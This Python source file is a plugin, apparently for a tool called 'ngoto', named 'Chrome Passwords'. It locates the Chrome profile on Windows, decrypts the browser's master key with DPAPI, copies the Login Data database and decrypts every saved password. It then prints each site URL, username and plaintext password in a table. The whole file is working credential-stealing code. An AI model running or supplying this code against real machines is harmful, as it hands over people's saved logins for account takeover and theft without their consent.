from ngoto.core.util.plugin import PluginBase
from ngoto.core.util.logging import Logging
from ngoto.core.util.interface import output
from rich.table import Table, Style  # used in this plugin
from dataclasses import dataclass


class Plugin(PluginBase):
    name = 'Chrome Passwords'
    version = 0.1
    description = 'Get stored chrome passwords'
    req_modules: list = ['pycryptodome']
    req_apis: list = []
    logger: Logging = None
    parameters: list = []
    os: list = ['Windows']

    table: Table = None
    title_style = Style(color="blue", blink=False, bold=True)
    border_style = Style(color="black", blink=False, bold=True)
    header_style = Style(color="black", blink=False, bold=True)

    def get_chrome_datetime(self, chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since
        January, 1601"""
        from datetime import datetime, timedelta
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        import os
        import json
        import base64
        import win32crypt
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        from Crypto.Cipher import AES
        import win32crypt
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except Exception as e:
            try:
                self.logger.warning(
                    f'Could not decrypt password, {e}',
                    program='Chrome Passwords')
                return str(win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1])
            except Exception as e2:
                self.logger.warning(
                    f'Could not decrypt password, {e2}',
                    program='Chrome Passwords')
                return ""

    def get_context(self) -> list:
        import shutil
        import os
        import sqlite3
        # get the AES key
        key = self.get_encryption_key()
        # local sqlite Chrome database path
        db_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local",
            "Google", "Chrome", "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute(
            ' '.join(
                ["select origin_url, action_url, username_value,",
                    "password_value, date_created, date_last_used",
                    "from logins order by date_created"]))

        @dataclass
        class Password:
            origin_url: str
            action_url: str
            username_value: str
            password_value: str
            date_created: str
            date_last_used: str

        passwords = []
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            passwords.append(
                Password(
                    str(origin_url),
                    str(action_url),
                    str(username),
                    str(password),
                    str(date_created),
                    str(date_last_used)
                    )
                )
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except Exception as e:
            self.logger.warning(
                f'Could not remove {filename}, {e}',
                program='Chrome Passwords')
        return {"passwords": passwords}

    # main function to handle input, then calls and return get_context method
    def main(self, logger):
        self.logger = logger
        logger.info('Getting Chrome Passwords', program='Chrome Passwords')
        context = self.get_context()
        logger.info('Successfully Got Passwords', program='Chrome Passwords')
        return context

    # given context of information prints information
    def print_info(self, context):
        self.table = Table(
            title="Ngoto Chrome Passwords Plugin",
            title_style=self.title_style,
            border_style=self.border_style)
        self.table.add_column("Origin URL", style=self.header_style)
        self.table.add_column("Action URL", style=self.header_style)
        self.table.add_column("Username", style=self.header_style)
        self.table.add_column("Password", style=self.header_style)
        self.table.add_column("Creation Date", style=self.header_style)
        self.table.add_column("Last Used", style=self.header_style)
        for password in context["passwords"]:
            self.table.add_row(
                password.origin_url,
                password.action_url,
                password.username_value,
                password.password_value,
                password.date_created,
                password.date_last_used)
        output(self.table)

    # holds sqlite3 create table query to store information
    def create_table(self):
        return ''
